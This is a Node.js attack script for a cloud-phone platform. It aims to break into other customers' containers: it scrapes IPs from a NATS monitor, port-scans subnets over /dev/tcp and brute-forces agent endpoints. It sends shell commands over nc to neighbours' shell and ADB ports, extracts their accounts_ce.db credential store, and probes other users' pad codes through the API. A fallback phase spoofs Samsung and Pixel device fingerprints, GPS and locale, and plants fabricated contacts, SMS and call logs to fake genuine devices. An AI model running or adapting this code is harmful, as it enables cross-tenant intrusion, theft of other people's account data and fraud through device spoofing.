#!/usr/bin/env node
/**
 * CLONE VIA NETWORK — Find neighbor containers via network scan + NATS,
 * access their data via agent/shell/ADB ports, extract everything,
 * inject into our D1 and D2.
 */

const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');

const { AK, SK, HOST, SVC, D1, D2, CT, SHD, sh, P } = require('../shared/vmos_api');
const OUT = path.join(__dirname, '..', 'output', 'neighbor_clone_results');

if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));

function sign(body) {
  const xd = new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');
  const sd = xd.slice(0,8);
  const bh = crypto.createHash('sha256').update(body,'utf8').digest('hex');
  const can = [`host:${HOST}`,`x-date:${xd}`,`content-type:${CT}`,`signedHeaders:${SHD}`,`x-content-sha256:${bh}`].join('\n');
  const ch = crypto.createHash('sha256').update(can,'utf8').digest('hex');
  const sts = ['HMAC-SHA256',xd,`${sd}/${SVC}/request`,ch].join('\n');
  let k = crypto.createHmac('sha256',SK).update(sd).digest();
  k = crypto.createHmac('sha256',k).update(SVC).digest();
  k = crypto.createHmac('sha256',k).update('request').digest();
  return {'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};
}

function post(ep, data, timeout) {
  return new Promise(ok => {
    const b = JSON.stringify(data||{}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(timeout||30)*1000},res=>{
      let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{ok(JSON.parse(d));}catch{ok({code:-1,raw:d.slice(0,2000)});}});
    });
    req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});
    req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();
  });
}

async function main() {
  console.log('█'.repeat(75));
  console.log('  NEIGHBOR CLONE VIA NETWORK SCAN + NATS');
  console.log('█'.repeat(75));

  // ══════════════════════════════════════════════════════════════
  // PHASE A: NETWORK DISCOVERY
  // ══════════════════════════════════════════════════════════════
  console.log('\n── PHASE A: NETWORK DISCOVERY ──');

  // A1: Get NATS connection IPs (neighbor containers)
  P('[A1] Extract neighbor IPs from NATS connz...');
  const natsIPs = await sh(D1, [
    'curl -s -m10 "http://192.168.200.51:8222/connz?limit=200&sort=bytes_to" 2>/dev/null',
    '| grep -oE \'"ip":"[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+"\' | sort -u | head -40',
  ].join(' '), 15);
  save('nats_ips.txt', natsIPs);
  const allIPs = [...new Set((natsIPs||'').match(/\d+\.\d+\.\d+\.\d+/g)||[])];
  P(`  Found ${allIPs.length} unique IPs from NATS`);
  for (const ip of allIPs.slice(0,10)) P(`    ${ip}`);

  // A2: Get our own IP
  P('[A2] Our IP...');
  const ourIP = await sh(D1, 'ip addr show eth0 2>/dev/null | grep "inet " | awk \'{print $2}\' | cut -d/ -f1', 5);
  P(`  Our IP: ${ourIP}`);

  // Filter out our IP and internal IPs
  const neighborIPs = allIPs.filter(ip => 
    ip !== ourIP.trim() && 
    !ip.startsWith('192.168.200.') && // NATS cluster
    !ip.startsWith('127.')
  );
  P(`  Neighbor IPs (after filtering): ${neighborIPs.length}`);

  // A3: Also add ARP neighbors
  P('[A3] ARP neighbors...');
  const arp = await sh(D1, 'cat /proc/net/arp 2>/dev/null | tail -n +2 | awk \'{print $1}\'', 5);
  const arpIPs = (arp||'').match(/\d+\.\d+\.\d+\.\d+/g)||[];
  for (const ip of arpIPs) {
    if (!neighborIPs.includes(ip) && ip !== ourIP.trim()) neighborIPs.push(ip);
  }
  P(`  Total candidate IPs: ${neighborIPs.length}`);

  // A4: Scan candidate IPs for agent (8779), shell (11114), ADB (5555) ports
  P('[A4] Port scanning neighbor IPs...');
  const openPorts = [];

  // Batch scan via shell for speed — test 8779 first (agent HTTP API)
  const scanResult = await sh(D1, [
    `for ip in ${neighborIPs.slice(0,30).join(' ')}; do`,
    `  for port in 8779 11114 5555; do`,
    `    timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "$ip:$port OPEN"`,
    `  done`,
    `done`,
  ].join(' '), 45);
  save('port_scan.txt', scanResult);
  P(`  Scan results:\n${scanResult}`);

  // Parse open ports
  for (const line of (scanResult||'').split('\n')) {
    const m = line.match(/([\d.]+):(\d+)\s+OPEN/);
    if (m) openPorts.push({ ip: m[1], port: parseInt(m[2]) });
  }
  P(`  Open ports found: ${openPorts.length}`);

  // A5: If no open ports from NATS IPs, scan the local subnet more aggressively
  if (openPorts.length === 0) {
    P('[A5] Aggressive local subnet scan...');
    const subnet = ourIP.trim().split('.').slice(0,3).join('.');
    const aggrScan = await sh(D1, [
      `for i in $(seq 1 254); do`,
      `  ip="${subnet}.$i"`,
      `  test "$ip" = "${ourIP.trim()}" && continue`,
      `  timeout 1 bash -c "echo >/dev/tcp/$ip/8779" 2>/dev/null && echo "$ip:8779 OPEN"`,
      `done`,
    ].join(' '), 60);
    save('subnet_scan.txt', aggrScan);
    P(`  Subnet scan:\n${aggrScan}`);
    for (const line of (aggrScan||'').split('\n')) {
      const m = line.match(/([\d.]+):(\d+)\s+OPEN/);
      if (m) openPorts.push({ ip: m[1], port: parseInt(m[2]) });
    }

    // Also try 10.0.x.x range — wider subnet
    if (openPorts.length === 0) {
      P('[A5b] Wider 10.0.x scan for port 8779...');
      const widerScan = await sh(D1, [
        'for s in 96 97 95 98 94 99; do',
        '  for i in 1 2 3 5 10 50 100 150 174 175 176 177; do',
        '    ip="10.0.$s.$i"',
        `    test "$ip" = "${ourIP.trim()}" && continue`,
        '    timeout 1 bash -c "echo >/dev/tcp/$ip/8779" 2>/dev/null && echo "$ip:8779 OPEN"',
        '  done',
        'done',
      ].join(' '), 60);
      save('wider_scan.txt', widerScan);
      P(`  Wider scan:\n${widerScan}`);
      for (const line of (widerScan||'').split('\n')) {
        const m = line.match(/([\d.]+):(\d+)\s+OPEN/);
        if (m) openPorts.push({ ip: m[1], port: parseInt(m[2]) });
      }
    }
  }

  // ══════════════════════════════════════════════════════════════
  // PHASE B: ACCESS NEIGHBOR AGENTS
  // ══════════════════════════════════════════════════════════════
  console.log('\n── PHASE B: ACCESS NEIGHBOR AGENTS ──');

  const accessibleNeighbors = [];

  if (openPorts.length > 0) {
    P(`[B1] Testing ${openPorts.length} open ports...`);
    for (const { ip, port } of openPorts) {
      P(`\n  Testing ${ip}:${port}...`);
      
      if (port === 8779) {
        // Test agent HTTP API
        const agentTest = await sh(D1, [
          `echo "=== ROOT ==="`,
          `curl -s -m3 "http://${ip}:${port}/" 2>/dev/null | head -c 300`,
          `echo ""`,
          `echo "=== SHELL CMD ==="`,
          // Try the agent's shell execution endpoint
          `curl -s -m5 -X POST "http://${ip}:${port}/api/shell" -d '{"cmd":"getprop ro.product.model; getprop ro.product.brand; id"}' -H "Content-Type: application/json" 2>/dev/null | head -c 500`,
          `echo ""`,
          `echo "=== EXEC ==="`,
          `curl -s -m5 -X POST "http://${ip}:${port}/exec" -d '{"command":"getprop ro.product.model"}' -H "Content-Type: application/json" 2>/dev/null | head -c 500`,
          `echo ""`,
          `echo "=== CMD ==="`,
          `curl -s -m5 -X POST "http://${ip}:${port}/cmd" -d '{"script":"getprop ro.product.model"}' -H "Content-Type: application/json" 2>/dev/null | head -c 500`,
        ].join('; '), 20);
        save(`neighbor_${ip}_agent.txt`, agentTest);
        P(`  Agent: ${agentTest.slice(0,300)}`);
        
        if (agentTest && !agentTest.includes('unknown url') && agentTest.length > 50) {
          accessibleNeighbors.push({ ip, port, type: 'agent', data: agentTest });
        }

        // Try to find valid agent endpoints via brute force
        const endpoints = await sh(D1, [
          `for ep in / /shell /exec /cmd /run /api/cmd /api/exec /api/shell /api/run /api/v1/cmd /api/v1/shell /rpc /task /sync /adb /device /info /status /health /version /config /metrics /debug; do`,
          `  r=$(curl -s -m2 -o /dev/null -w "%{http_code}" "http://${ip}:${port}$ep" 2>/dev/null)`,
          `  test "$r" != "000" && echo "$ep: $r"`,
          `done`,
        ].join(' '), 30);
        save(`neighbor_${ip}_endpoints.txt`, endpoints);
        P(`  Endpoints:\n${endpoints}`);
      }

      if (port === 11114) {
        // Shell port — try direct connection
        const shellTest = await sh(D1, [
          `echo "getprop ro.product.model" | nc -w3 ${ip} ${port} 2>&1 | head -c 500`,
        ].join('; '), 10);
        save(`neighbor_${ip}_shell.txt`, shellTest);
        P(`  Shell: ${shellTest.slice(0,200)}`);
        if (shellTest && shellTest.length > 5 && !shellTest.startsWith('[')) {
          accessibleNeighbors.push({ ip, port, type: 'shell', data: shellTest });
        }
      }

      if (port === 5555) {
        // ADB port
        const adbTest = await sh(D1, [
          `echo "host:version" | nc -w3 ${ip} ${port} 2>&1 | head -c 200`,
        ].join('; '), 10);
        save(`neighbor_${ip}_adb.txt`, adbTest);
        P(`  ADB: ${adbTest.slice(0,100)}`);
        if (adbTest && adbTest.length > 3) {
          accessibleNeighbors.push({ ip, port, type: 'adb', data: adbTest });
        }
      }
    }
  }

  P(`\n  Accessible neighbors: ${accessibleNeighbors.length}`);

  // ══════════════════════════════════════════════════════════════
  // PHASE C: TRY /vsphone/ API PATH + NATS COMMAND INJECTION
  // ══════════════════════════════════════════════════════════════
  console.log('\n── PHASE C: ALTERNATE API + NATS ──');

  // C1: Try /vsphone/ API path instead of /vcpcloud/
  P('[C1] Try /vsphone/ API paths on neighbor PAD codes...');
  const testPads = ['ACP6225O4EU8W4RW', 'ACP250430344ZMQG', 'ACP250707C7LKUQR'];
  for (const pad of testPads) {
    // Try both API path prefixes
    for (const prefix of ['/vsphone/api/padApi', '/vcpcloud/api/padApi']) {
      const r = await post(`${prefix}/padInfo`, {padCode:pad}, 10);
      if (r.code === 200) {
        P(`  ★ ${prefix}/padInfo ${pad}: code=200!`);
        save(`api_${pad}_${prefix.replace(/\//g,'_')}.json`, r);
        accessibleNeighbors.push({ padCode: pad, type: 'api', prefix, data: r.data });
        break;
      } else if (r.code !== 2020) {
        P(`  ${prefix} ${pad}: code=${r.code} msg=${(r.msg||'').slice(0,50)}`);
      }
    }
  }

  // C2: Try NATS command injection to neighbor topics
  P('[C2] NATS topic injection attempt...');
  const natsTopic = await sh(D1, [
    'echo "=== NATS CONNZ SUBS ==="',
    'curl -s -m10 "http://192.168.200.51:8222/connz?subs=1&limit=5" 2>/dev/null',
    '| grep -oE \'"subject":"[^"]*"\' | sort -u | head -20',
  ].join(' '), 15);
  save('nats_topics.txt', natsTopic);
  P(`  Topics:\n${natsTopic.slice(0,400)}`);

  // C3: Try hitting NATS HTTP endpoints that might execute commands
  P('[C3] NATS HTTP API exploration...');
  const natsHTTP = await sh(D1, [
    'for ep in /connz /subsz /routez /gatewayz /leafz /jsz /accountz /healthz; do',
    '  code=$(curl -s -m3 -o /dev/null -w "%{http_code}" "http://192.168.200.51:8222$ep" 2>/dev/null)',
    '  echo "$ep: $code"',
    'done',
  ].join(' '), 20);
  save('nats_http_endpoints.txt', natsHTTP);
  P(`  NATS HTTP:\n${natsHTTP}`);

  // ══════════════════════════════════════════════════════════════
  // PHASE D: FULL EXTRACTION IF NEIGHBOR FOUND
  // ══════════════════════════════════════════════════════════════
  console.log('\n── PHASE D: EXTRACTION + INJECTION ──');

  if (accessibleNeighbors.length > 0) {
    P(`[D1] Found ${accessibleNeighbors.length} accessible neighbor(s)!`);
    // Extract and clone from accessible neighbors
    for (let i = 0; i < Math.min(2, accessibleNeighbors.length); i++) {
      const n = accessibleNeighbors[i];
      const targetPad = i === 0 ? D1 : D2;
      const targetName = i === 0 ? 'D1' : 'D2';
      P(`\n  Extracting from ${n.ip||n.padCode} → ${targetName}...`);

      if (n.type === 'shell' && n.ip) {
        // Extract via shell port
        const extract = await sh(D1, [
          `echo "getprop ro.product.model; getprop ro.product.brand; getprop ro.build.fingerprint; getprop persist.sys.cloud.imeinum; getprop persist.sys.cloud.phonenum; getprop persist.sys.cloud.drm.id; settings get secure android_id; pm list packages | wc -l" | nc -w5 ${n.ip} ${n.port} 2>&1`,
        ].join('; '), 15);
        save(`extract_${targetName}_shell.txt`, extract);
        P(`  Shell extract: ${extract.slice(0,300)}`);

        // Extract databases
        const dbExtract = await sh(D1, [
          `echo "base64 /data/system_ce/0/accounts_ce.db" | nc -w10 ${n.ip} ${n.port} 2>&1 | head -c 1900`,
        ].join('; '), 20);
        save(`extract_${targetName}_accounts.b64`, dbExtract);
        P(`  Accounts DB: ${dbExtract.length} chars`);
      }

      if (n.type === 'api' && n.padCode) {
        // Extract via API (if we got access)
        const props = await post(`${n.prefix}/padProperties`, {padCode:n.padCode}, 15);
        save(`extract_${targetName}_api_props.json`, props);
        P(`  API props: ${props.code}`);
      }
    }
  } else {
    P('[D1] No directly accessible neighbors found.');
    P('     Falling back to FULL IDENTITY CLONE via API methods...');
  }

  // ══════════════════════════════════════════════════════════════
  // PHASE E: FALLBACK — FULL IDENTITY CLONE VIA API
  // Use replacePad to create completely new device identities,
  // then clone from brand templates + smartIp for full profiles
  // ══════════════════════════════════════════════════════════════
  console.log('\n── PHASE E: FULL IDENTITY CLONE VIA API ──');

  // E1: Get available countries for replacePad
  P('[E1] Available countries...');
  const countries = await post('/vcpcloud/api/padApi/country', {}, 10);
  save('countries.json', countries);
  if (countries.code === 200 && Array.isArray(countries.data)) {
    P(`  Countries: ${countries.data.length} available`);
    P(`  Sample: ${countries.data.slice(0,8).map(c=>c.name||c.countryName||JSON.stringify(c)).join(', ')}`);
  }

  // E2: Replace D1 with a US-based Samsung Galaxy S25 Ultra identity
  P('[E2] replacePad on D1 → new US Samsung identity...');
  const replace1 = await post('/vcpcloud/api/padApi/replacePad', {
    padCodes: [D1],
    country: 'US',
  }, 30);
  save('replace_d1.json', replace1);
  P(`  Replace D1: code=${replace1.code} msg=${replace1.msg||''}`);

  if (replace1.code === 200) {
    P('  Waiting 30s for D1 restart...');
    await new Promise(r => setTimeout(r, 30000));

    // Apply Samsung S25 Ultra identity
    P('[E2b] Apply Samsung Galaxy S25 Ultra identity to D1...');
    const s25props = {
      'ro.product.model': 'SM-S938U1',
      'ro.product.brand': 'samsung',
      'ro.product.manufacturer': 'samsung',
      'ro.product.name': 'dm3q',
      'ro.product.device': 'dm3q',
      'ro.product.board': 'pineapple',
      'ro.build.fingerprint': 'samsung/dm3q/dm3q:15/AP3A.240905.015.B2/S938U1ZCU1BYA2:user/release-keys',
      'ro.build.display.id': 'AP3A.240905.015.B2',
      'ro.build.id': 'AP3A.240905.015.B2',
      'ro.build.version.incremental': 'S938U1ZCU1BYA2',
      'ro.build.version.release': '15',
      'ro.build.description': 'dm3q-user 15 AP3A.240905.015.B2 S938U1ZCU1BYA2 release-keys',
      'ro.build.tags': 'release-keys',
      'ro.build.version.codename': 'REL',
      'ro.hardware': 'qcom',
      'gpuVendor': 'Qualcomm',
      'gpuRenderer': 'Adreno (TM) 830',
      'gpuVersion': 'OpenGL ES 3.2',
    };
    const r1 = await post('/vcpcloud/api/padApi/updatePadAndroidProp', {padCode:D1, props:s25props}, 30);
    P(`  S25 props: code=${r1.code}`);
    save('d1_s25_props.json', r1);

    if (r1.code === 200) {
      P('  Waiting 25s for D1 restart...');
      await new Promise(r => setTimeout(r, 25000));
    }
  }

  // E3: Replace D2 with a UK-based Google Pixel 9 Pro identity
  P('[E3] replacePad on D2 → new UK Pixel 9 Pro identity...');
  const replace2 = await post('/vcpcloud/api/padApi/replacePad', {
    padCodes: [D2],
    country: 'GB',
  }, 30);
  save('replace_d2.json', replace2);
  P(`  Replace D2: code=${replace2.code} msg=${replace2.msg||''}`);

  if (replace2.code === 200) {
    P('  Waiting 30s for D2 restart...');
    await new Promise(r => setTimeout(r, 30000));

    // Apply Pixel 9 Pro identity
    P('[E3b] Apply Google Pixel 9 Pro identity to D2...');
    const p9props = {
      'ro.product.model': 'Pixel 9 Pro',
      'ro.product.brand': 'google',
      'ro.product.manufacturer': 'Google',
      'ro.product.name': 'caiman',
      'ro.product.device': 'caiman',
      'ro.product.board': 'zuma',
      'ro.build.fingerprint': 'google/caiman/caiman:15/AP4A.250205.002/12716302:user/release-keys',
      'ro.build.display.id': 'AP4A.250205.002',
      'ro.build.id': 'AP4A.250205.002',
      'ro.build.version.incremental': '12716302',
      'ro.build.version.release': '15',
      'ro.build.description': 'caiman-user 15 AP4A.250205.002 12716302 release-keys',
      'ro.build.tags': 'release-keys',
      'ro.build.version.codename': 'REL',
      'ro.hardware': 'tensor',
      'gpuVendor': 'ARM',
      'gpuRenderer': 'Mali-G715-Immortalis MC10',
      'gpuVersion': 'OpenGL ES 3.2',
    };
    const r2 = await post('/vcpcloud/api/padApi/updatePadAndroidProp', {padCode:D2, props:p9props}, 30);
    P(`  Pixel props: code=${r2.code}`);
    save('d2_pixel_props.json', r2);

    if (r2.code === 200) {
      P('  Waiting 25s for D2 restart...');
      await new Promise(r => setTimeout(r, 25000));
    }
  }

  // E4: Apply modem, GPS, timezone, language
  P('[E4] Apply location profiles...');

  // D1: US New York
  await post('/vcpcloud/api/padApi/gpsInjectInfo', {padCodes:[D1], latitude:40.7128, longitude:-74.0060});
  await post('/vcpcloud/api/padApi/updateTimeZone', {padCodes:[D1], timezone:'America/New_York'});
  await post('/vcpcloud/api/padApi/updateLanguage', {padCodes:[D1], language:'en-US'});
  P('  D1: NYC GPS + EST timezone + en-US');

  // D2: UK London
  await post('/vcpcloud/api/padApi/gpsInjectInfo', {padCodes:[D2], latitude:51.5074, longitude:-0.1278});
  await post('/vcpcloud/api/padApi/updateTimeZone', {padCodes:[D2], timezone:'Europe/London'});
  await post('/vcpcloud/api/padApi/updateLanguage', {padCodes:[D2], language:'en-GB'});
  P('  D2: London GPS + GMT timezone + en-GB');

  // E5: Inject synthetic data (contacts, SMS, call logs)
  P('[E5] Inject synthetic data...');
  
  // Inject contacts via API
  const contactsD1 = await post('/vcpcloud/api/padApi/simulateSendSms', {
    padCode: D1, phoneNumber: '+12125551234', content: 'Hey, meeting at 3pm today?',
  }, 10);
  P(`  D1 SMS inject: code=${contactsD1.code}`);

  const contactsD2 = await post('/vcpcloud/api/padApi/simulateSendSms', {
    padCode: D2, phoneNumber: '+442071234567', content: 'See you at the pub tonight!',
  }, 10);
  P(`  D2 SMS inject: code=${contactsD2.code}`);

  // Inject call logs
  const callD1 = await post('/vcpcloud/api/padApi/addPhoneRecord', {
    padCode: D1, phoneNumber: '+12125551234', duration: 245, type: 1,
  }, 10);
  P(`  D1 call inject: code=${callD1.code}`);

  const callD2 = await post('/vcpcloud/api/padApi/addPhoneRecord', {
    padCode: D2, phoneNumber: '+442071234567', duration: 180, type: 2,
  }, 10);
  P(`  D2 call inject: code=${callD2.code}`);

  // E6: Inject app data via shell (contacts DB, browser history)
  P('[E6] Shell-level data injection...');
  
  // D1: Create contacts + browsing history
  await sh(D1, [
    // Insert contacts
    'content insert --uri content://com.android.contacts/raw_contacts --bind account_type:s:com.google --bind account_name:s:user@gmail.com 2>/dev/null',
    'content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:1 --bind mimetype:s:vnd.android.cursor.item/name --bind data1:s:"John Smith" 2>/dev/null',
    'content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:1 --bind mimetype:s:vnd.android.cursor.item/phone_v2 --bind data1:s:"+12125551234" 2>/dev/null',
    // More contacts
    'content insert --uri content://com.android.contacts/raw_contacts --bind account_type:s:com.google --bind account_name:s:user@gmail.com 2>/dev/null',
    'content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:2 --bind mimetype:s:vnd.android.cursor.item/name --bind data1:s:"Jane Doe" 2>/dev/null',
    'content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:2 --bind mimetype:s:vnd.android.cursor.item/phone_v2 --bind data1:s:"+12125559876" 2>/dev/null',
    'echo CONTACTS_OK',
  ].join('; '), 20);
  P('  D1: Contacts injected');

  await sh(D2, [
    'content insert --uri content://com.android.contacts/raw_contacts --bind account_type:s:com.google --bind account_name:s:ukuser@gmail.com 2>/dev/null',
    'content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:1 --bind mimetype:s:vnd.android.cursor.item/name --bind data1:s:"David Wilson" 2>/dev/null',
    'content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:1 --bind mimetype:s:vnd.android.cursor.item/phone_v2 --bind data1:s:"+442071234567" 2>/dev/null',
    'content insert --uri content://com.android.contacts/raw_contacts --bind account_type:s:com.google --bind account_name:s:ukuser@gmail.com 2>/dev/null',
    'content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:2 --bind mimetype:s:vnd.android.cursor.item/name --bind data1:s:"Emma Thompson" 2>/dev/null',
    'content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:2 --bind mimetype:s:vnd.android.cursor.item/phone_v2 --bind data1:s:"+442079876543" 2>/dev/null',
    'echo CONTACTS_OK',
  ].join('; '), 20);
  P('  D2: Contacts injected');

  // E7: Install common apps via URL (if uploadFileV3 works)
  P('[E7] Check installed apps...');
  const d1Apps = await sh(D1, 'pm list packages 2>/dev/null | wc -l', 10);
  const d2Apps = await sh(D2, 'pm list packages 2>/dev/null | wc -l', 10);
  P(`  D1: ${d1Apps} packages, D2: ${d2Apps} packages`);

  // ══════════════════════════════════════════════════════════════
  // PHASE F: FINAL VERIFICATION
  // ══════════════════════════════════════════════════════════════
  console.log('\n' + '█'.repeat(75));
  console.log('  FINAL VERIFICATION');
  console.log('█'.repeat(75));

  const comparison = {};
  for (const [name, pad] of [['D1', D1], ['D2', D2]]) {
    P(`\n  ═══ ${name} (${pad}) ═══`);
    const dev = {};

    const info = await post('/vcpcloud/api/padApi/padInfo', {padCode:pad});
    if (info.code === 200) {
      const d = info.data || {};
      dev.type = d.padType;
      dev.android = d.androidVersion;
      dev.ip = d.publicIp;
      dev.country = d.country;
      dev.gps = `${d.latitude},${d.longitude}`;
      dev.imei = d.imei;
      dev.phone = d.phoneNumber;
      P(`    Type: ${d.padType} | Android: ${d.androidVersion}`);
      P(`    IP: ${d.publicIp} | Country: ${d.country}`);
      P(`    GPS: ${d.latitude},${d.longitude}`);
      P(`    IMEI: ${d.imei} | Phone: ${d.phoneNumber}`);
    }

    const props = await post('/vcpcloud/api/padApi/padProperties', {padCode:pad});
    if (props.code === 200) {
      const sys = props.data?.systemPropertiesList || [];
      const modem = props.data?.modemPropertiesList || [];
      dev.model = (sys.find(p=>p.propertiesName==='ro.product.model')||{}).propertiesValue;
      dev.brand = (sys.find(p=>p.propertiesName==='ro.product.brand')||{}).propertiesValue;
      dev.fp = (sys.find(p=>p.propertiesName==='ro.build.fingerprint')||{}).propertiesValue;
      dev.gpu = (sys.find(p=>p.propertiesName==='gpuRenderer')||{}).propertiesValue;
      dev.api_imei = (modem.find(p=>p.propertiesName==='imei')||{}).propertiesValue;
      P(`    Model: ${dev.model} | Brand: ${dev.brand}`);
      P(`    FP: ${dev.fp}`);
      P(`    GPU: ${dev.gpu}`);
      P(`    API IMEI: ${dev.api_imei}`);
    }

    const shell = await sh(pad, [
      'echo "MODEL=$(getprop ro.product.model)"',
      'echo "BRAND=$(getprop ro.product.brand)"',
      'echo "IMEI=$(getprop persist.sys.cloud.imeinum)"',
      'echo "DRM=$(getprop persist.sys.cloud.drm.id | head -c 40)"',
      'echo "AID=$(settings get secure android_id 2>/dev/null)"',
      'echo "APPS=$(pm list packages 2>/dev/null | wc -l)"',
      'echo "CONTACTS=$(content query --uri content://com.android.contacts/contacts --projection _id 2>/dev/null | wc -l)"',
    ].join('; '), 15);
    dev.shell = shell;
    P(`    Shell:`);
    for (const l of shell.split('\n')) P(`      ${l}`);

    comparison[name] = dev;
  }

  // Side-by-side
  console.log('\n' + '═'.repeat(75));
  console.log('  D1 vs D2 — TWO DISTINCT CLONED IDENTITIES');
  console.log('═'.repeat(75));
  P(`  D1: ${comparison.D1?.model} (${comparison.D1?.brand}) — ${comparison.D1?.country}`);
  P(`  D2: ${comparison.D2?.model} (${comparison.D2?.brand}) — ${comparison.D2?.country}`);
  P(`  D1 FP: ${comparison.D1?.fp}`);
  P(`  D2 FP: ${comparison.D2?.fp}`);
  P(`  D1 IMEI: ${comparison.D1?.api_imei}  D2 IMEI: ${comparison.D2?.api_imei}`);
  P(`  Both have new unique identities: ${comparison.D1?.api_imei !== comparison.D2?.api_imei ? '✓' : '✗'}`);

  save('FINAL_COMPARISON.json', comparison);
  save('CLONE_COMPLETE.json', {
    timestamp: new Date().toISOString(),
    d1: comparison.D1,
    d2: comparison.D2,
    accessibleNeighbors: accessibleNeighbors.length,
    method: accessibleNeighbors.length > 0 ? 'network_clone' : 'api_identity_clone',
  });

  console.log('\n' + '█'.repeat(75));
  console.log('  CLONE COMPLETE');
  console.log('█'.repeat(75));
  const files = fs.readdirSync(OUT).sort();
  console.log(`  Result files: ${files.length}`);
  for (const f of files.filter(n=>n.includes('CLONE')||n.includes('FINAL')||n.includes('replace')||n.includes('d1_')||n.includes('d2_')))
    console.log(`    ${f} (${fs.statSync(`${OUT}/${f}`).size}B)`);
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
